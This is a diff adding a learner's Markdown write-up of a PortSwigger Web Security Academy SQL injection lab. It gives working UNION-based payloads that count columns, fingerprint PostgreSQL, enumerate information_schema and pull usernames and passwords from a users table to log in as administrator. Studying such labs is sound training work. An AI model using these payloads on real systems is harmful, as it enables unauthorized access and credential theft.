@@ -1,0 +1,83 @@
+# SQL Injection Attack – Listing Database Contents
+
+**Vulnerability:** SQL Injection
+**Difficulty:** Practitioner
+**Platform:** PortSwigger Web Security Academy
+
+## Goal
+
+Log in as the administrator user.
+
+## Steps
+
+1. Opened the lab and found the **stock check** feature.
+
+2. Captured the stock check request in **Burp Suite** and tested the parameter with `'`.
+
+3. The application returned an internal error, which indicated that the parameter was vulnerable to SQL injection.
+
+4. Used:
+
+```sql
+' ORDER BY 2--
+```
+
+This confirmed that there were **2 columns**.
+
+5. Used a UNION query to identify the database:
+
+```sql
+' UNION SELECT VERSION(), NULL--
+```
+
+The response showed that the database was **PostgreSQL**.
+
+6. Retrieved the table names using:
+
+```sql
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
+
+This revealed the table:
+
+```text
+users_jonlzb
+```
+
+7. Retrieved the column names:
+
+```sql
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_jonlzb'--
+```
+
+The important columns were:
+
+```text
+username_mpweek
+password_bldkor
+```
+
+8. Retrieved the usernames and passwords using:
+
+```sql
+' UNION SELECT username_mpweek, password_bldkor FROM users_jonlzb--
+```
+
+9. Found the administrator credentials and used them to log in.
+
+10. **Lab solved successfully.** ✅
+
+## Impact
+
+An SQL injection vulnerability can allow an attacker to access sensitive database information, including usernames and passwords.
+
+## What I Learned
+
+* How to identify SQL injection using Burp Suite.
+* How to find the number of columns using `ORDER BY`.
+* How to use `UNION SELECT` for database enumeration.
+* How to identify PostgreSQL using `VERSION()`.
+* How to find tables and columns using `information_schema`.
+* How to retrieve data from a vulnerable database.
+
+**Status:** ✅ Lab Solved
